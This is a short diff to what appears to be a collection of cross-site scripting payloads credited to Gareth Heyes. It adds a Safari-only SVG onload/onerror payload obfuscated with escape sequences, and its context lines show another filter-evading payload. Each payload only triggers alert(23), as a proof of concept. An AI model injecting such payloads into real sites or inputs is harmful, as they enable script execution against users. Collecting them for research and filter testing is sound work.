@@ -81,6 +81,12 @@ Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-w
     
 ---
 
+Only Safari [Garethheyes](https://x.com/garethheyes/status/1860061735341949440)
+
+    <svg onload=onerror=eval,new'\u0022-alert\x2823\x29//'>
+    
+---
+
 [Garethheyes](https://twitter.com/garethheyes/status/1126526480614416395)
 
     {onerror=alert}throw 23
